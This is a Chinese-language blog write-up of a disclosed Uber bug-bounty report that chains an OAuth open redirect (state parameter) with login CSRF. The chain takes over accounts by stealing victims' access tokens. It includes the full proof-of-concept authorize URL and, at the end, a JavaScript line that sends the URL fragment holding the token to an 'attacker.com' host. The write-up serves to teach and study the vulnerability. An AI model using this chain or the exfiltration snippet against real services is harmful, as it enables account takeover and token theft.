# 漏洞散记
##  重定向窃取token
> 一直想找这么一个漏洞的，因为最近一直在看重定向的利用，就发现，重定向这种漏洞很奇特，他单独没有什么特点，但是如果有结合，就非常的具有威力，这次就是很经典的一个漏洞。Uber的认证重定向。

> 漏洞价值:8000$

> 源漏洞:[report](http://ngailong.com/uber-login-csrf-open-redirect-account-takeover/)

# 挖洞过程
作者回应了一个airbnb的[认证漏洞](https://www.arneswinnen.net/2017/06/authentication-bypass-on-airbnb-via-oauth-tokens-theft/),分享了自己挖掘的Uber的这个OAuth处非常经典的漏洞。

众所周知，一个网站上有很多的链接，是需要登录后才能访问的，因此就存在OAuth认证的操作。就是当你点击一个链接时，会进行登录认证，比如输入帐号密码，当认证结束后，就会携带着token跳转到链接的那个页面,可以看看[简书](http://www.jianshu.com/p/0db71eb445c8)的这个解释。

## Uber的OAuth认证

用原作者的案例来说，点击的页面指向的是**somewhere**这个页面，那么认证流程就如下:

1. https://central.uber.com/login?state=/somewhere
> `state`参数代表着访问的资源，也就说认证成功后要跳转的页面
2. https://login.uber.com/oauth/authorize?response_type=code&scope=profile%20history&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback&state=%2Fsomewhere
> 接着会先跳转到授权页面，也就是https://login.uber.com/oauth/authorize 这个页面，其中`client_id`是应用申请的ID，`redirect_uri`则是授权成功后跳转的页面
3. https://central.uber.com/oauth2-callback?state=%2Fsomewhere&code=it53JtFe6BPGH1arCLxQ6InrT4MXdd
> 授权成功，跳转到`redirect_uri`定义的URL上。并自动添加`code`参数
4. https://central.uber.com/somewhere
> 成功访问到了**somewhere**页面，其中因为`code`参数正确，所以服务器在第三步的响应中是携带了token的

认证流程很经典，准确的说，现在互联网上的OAuth认证全都如此，那么漏洞触发点在哪里呢？

## 第一个漏洞-任意重定向
很多任意重定向的漏洞都是发生在这个地方，就是在第一步时就更改`state`这个参数的值

作者正是如此做的，将**/somewhere**改成了**//google.com**

结果**2**,**3**两个流程的`state`都是**//google.com**,最终**4**跳转的页面也是**//google.com**

这个很容易理解，因为程序本身没有对`state`参数作校验，导致用户可以自定义跳转

但是这种漏洞其实本身的价值很低，没有什么实际用途，只能做做钓鱼，因此正如作者说的，Uber拒绝接收这个漏洞，但还是像我上面说的，这个漏洞如果有其他漏洞配合，那么价值非常大，我个人来说，CSRF和这个重定向是属于神配合，两个月前挖掘饿了么也曾遇到这么个漏洞，认证处的重定向，但是最后在改密码的部分卡住了，可能是因为限制了origin的,导致不成功也没有测试下去

言归正传，去深入挖掘的目标也是CSRF

## 第二个漏洞-CSRF

作者一开始没有想挖的CSRF，因为我觉得他是想偷懒，作者更改了第二步的`response_type`参数，将值从**code**改成了**token**，想着能不能直接返回**token**，结果作者发现因为没有返回可用的`code`，虽然返回了token，但是不进行跳转，这样就算是失败了，因为不能通过到这种方式获取到任何信息。
> https://central.uber.com/oauth2-callback?state=//google.com#access_token=xxxxx/

作者这时候想到的漏洞就是**login csrf**，一种很特殊的CSRF
```
Forging login requests[edit]
An attacker may forge a request to log the victim into a target website using the attacker's credentials; this is known as login CSRF. Login CSRF makes various novel attacks possible; for instance, an attacker can later log into the site with his legitimate credentials and view private information like activity history that has been saved in the account. This attack has been demonstrated against Google and Yahoo.
```

这个CSRF的用处在这儿的意义是什么呢？是提供了一个可用的`code`

## 漏洞的组合

先看看作者的POC：
```
https://login.uber.com/oauth/authorize?response_type=token&scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3dattacker_valid_oauth_code&state=%2F%2fhackerone.com
```

接着我们看下这样的认证流程吧:

1. https://login.uber.com/oauth/authorize?response_type=token&scope=profile%20history%20places%20ride_widgets%20request%20request_receipt%20all_trips&client_id=bOYt8vYWpnAacUZt9ng2LILDXnV-BAj4&redirect_uri=https%3A%2F%2Fcentral.uber.com%2Foauth2-callback%3fcode%3dattacker_valid_oauth_code&state=%2F%2fhackerone.com
> 作者更改的部分有`response_type`，将其改成**token**，是为了让后续生成的请求中携带token，还改了什么?改了`redirect_uri`，直接将自己的`code`添加成了跳转的参数

2. https://central.uber.com/oauth2-callback?state=%2F%2fhackerone.com&code={attacker_valid_oauth_code}#access_token={victim_access_token}
> 因为上一步的`redirect_uri`中本身就携带`code`,因此在这一步中，程序本身就直接获取了，重新拼接到了请求中，而且又因为`response_type`是**token**，所以在这个链接中就也拼接了

3. //hackerone.com#accesstoken={victim_access_token}

# 结语

在最后的时候原本有个问题就是怎么去获取的**#**后面的数据，原本想问作者的，但是先问了一波长短短，给了我一个`location.hash.slice(1)`，后来在变一变，就成了`window.location.href="http://attacker.com/?"+location.hash.slice(1)`,成功获取到数据

这个认证重定向窃取Token没什么可说的，个人认为经典中的经典，很值得学习与推敲
